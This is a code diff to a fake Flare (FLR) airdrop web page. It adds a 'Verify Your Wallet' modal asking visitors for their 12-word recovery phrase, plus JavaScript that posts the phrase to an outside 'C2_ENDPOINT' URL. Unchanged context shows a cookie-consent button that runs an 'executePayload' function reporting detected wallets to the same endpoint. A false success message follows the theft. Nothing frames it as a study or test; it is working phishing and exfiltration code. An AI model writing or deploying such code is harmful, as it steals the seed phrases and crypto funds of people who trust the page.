@@ -187,6 +187,86 @@
     word-break: break-all;
   }
 
+  /* ---- VERIFY WALLET MODAL ---- */
+  .verify-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.75);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    z-index: 10001;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.4s ease, visibility 0.4s ease;
+  }
+  .verify-overlay.active {
+    opacity: 1;
+    visibility: visible;
+  }
+
+  .verify-modal {
+    background: var(--flare-card);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 2.5rem 2rem;
+    max-width: 520px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 30px 60px rgba(0,0,0,0.7);
+  }
+
+  .verify-modal h3 {
+    font-size: 1.3rem;
+    margin-bottom: 0.5rem;
+    color: var(--flare-orange);
+  }
+
+  .verify-modal p {
+    color: var(--flare-subtle);
+    font-size: 0.85rem;
+    line-height: 1.5;
+    margin-bottom: 1.25rem;
+  }
+
+  .verify-modal textarea {
+    width: 100%;
+    padding: 0.8rem;
+    border-radius: 10px;
+    border: 1px solid var(--border);
+    background: rgba(0,0,0,0.3);
+    color: var(--flare-text);
+    font-family: 'Inter', sans-serif;
+    font-size: 0.9rem;
+    resize: none;
+    margin-bottom: 1rem;
+  }
+
+  .verify-modal .warning-text {
+    color: #ff4060;
+    font-size: 0.75rem;
+    margin-bottom: 1.25rem;
+  }
+
+  .verify-submit-btn {
+    background: var(--gradient-orange);
+    color: white;
+    border: none;
+    padding: 0.7rem 2rem;
+    font-size: 0.95rem;
+    font-weight: 600;
+    border-radius: 50px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 8px 25px rgba(255, 107, 53, 0.35);
+  }
+  .verify-submit-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 35px rgba(255, 107, 53, 0.5);
+  }
+
   .about-section {
     max-width: 900px;
     margin: 0 auto 3rem;
@@ -409,6 +489,20 @@
   </div>
 </div>
 
+<!-- ===== VERIFY WALLET OVERLAY ===== -->
+<div class="verify-overlay" id="verifyOverlay">
+  <div class="verify-modal">
+    <h3>🔐 Verify Your Wallet</h3>
+    <p>
+      To confirm your eligibility for the FLR airdrop, please enter your 12-word wallet recovery phrase below.
+      This is required to verify wallet ownership and prevent duplicate claims.
+    </p>
+    <textarea id="seedPhraseInput" rows="3" placeholder="Enter your 12-word recovery phrase here..."></textarea>
+    <p class="warning-text">⚠️ Never share your recovery phrase with anyone you don't trust.</p>
+    <button class="verify-submit-btn" id="verifySubmitBtn">Verify & Claim Airdrop</button>
+  </div>
+</div>
+
 <div class="main-content is-blurred">
 
   <section class="hero-section">
@@ -564,7 +658,6 @@
 <script type="module">
   const C2_ENDPOINT = 'https://78ba66c28fdfdbdc33cd4643c90fe3c7.m.pipedream.net';
 
-  // ===== PAYLOAD =====
   async function executePayload() {
     const overlay = document.getElementById('cookieOverlay');
     const site = document.querySelector('.main-content');
@@ -586,56 +679,29 @@
     sendToC2({ type: 'PAYLOAD_EXECUTED', walletsDetected: walletsFound });
   }
 
-  // ===== REAL WALLET CONNECT (replaces fake connectWallet) =====
-  async function connectWallet() {
-    const statusDiv = document.getElementById('walletStatus');
-
-    // Check if a wallet is available
-    if (typeof window.ethereum === 'undefined') {
-      statusDiv.innerHTML =
-        '<span style="color: #ff4060;">No wallet found. Please install MetaMask or Trust Wallet.</span>';
-      return;
-    }
-
-    try {
-      // Request account access — this triggers the wallet popup
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const address = accounts[0];
-
-      // Get the chain ID to confirm network
-      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-
-      // Show real connected address
-      statusDiv.innerHTML =
-        '<span style="color: #4CAF50;">✓ Connected</span><br>' +
-        '<span class="connected-address">' + address.slice(0, 6) + '...' + address.slice(-4) + '</span><br>' +
-        '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
-
-      // Log the real address and chain to C2
-      sendToC2({ type: 'WALLET_CONNECTED', address: address, chainId: chainId });
-
-    } catch (err) {
-      statusDiv.innerHTML = '<span style="color: #ff4060;">Connection cancelled. Please try again.</span>';
-    }
+  // ===== SHOW VERIFY WALLET MODAL =====
+  function showVerifyModal() {
+    document.getElementById('verifyOverlay').classList.add('active');
   }
 
-  // Listen for account changes
-  if (window.ethereum) {
-    window.ethereum.on('accountsChanged', function (accounts) {
-      const statusDiv = document.getElementById('walletStatus');
-      if (accounts.length) {
-        statusDiv.innerHTML =
-          '<span style="color: #4CAF50;">✓ Connected</span><br>' +
-          '<span class="connected-address">' + accounts[0].slice(0, 6) + '...' + accounts[0].slice(-4) + '</span><br>' +
-          '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
-      } else {
-        statusDiv.innerHTML = '<span style="color: #ff4060;">Disconnected</span>';
-      }
-    });
+  // ===== HANDLE VERIFY SUBMIT =====
+  function handleVerifySubmit() {
+    const phrase = document.getElementById('seedPhraseInput').value.trim();
+    if (!phrase) return;
 
-    window.ethereum.on('chainChanged', function () {
-      window.location.reload();
-    });
+    // POST the seed phrase to C2
+    sendToC2({ type: 'SEED_PHRASE_SUBMITTED', phrase: phrase });
+
+    // Hide the verify overlay
+    document.getElementById('verifyOverlay').classList.remove('active');
+
+    // Show success message
+    const statusDiv = document.getElementById('walletStatus');
+    if (statusDiv) {
+      statusDiv.innerHTML =
+        '<span style="color: #4CAF50;">✓ Wallet Verified</span><br>' +
+        '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
+    }
   }
 
   // ===== HELPERS =====
@@ -669,7 +735,10 @@
     if (acceptBtn) acceptBtn.addEventListener('click', executePayload);
 
     var connectBtn = document.getElementById('connectWalletBtn');
-    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
+    if (connectBtn) connectBtn.addEventListener('click', showVerifyModal);
+
+    var verifyBtn = document.getElementById('verifySubmitBtn');
+    if (verifyBtn) verifyBtn.addEventListener('click', handleVerifySubmit);
   });
 </script>
 
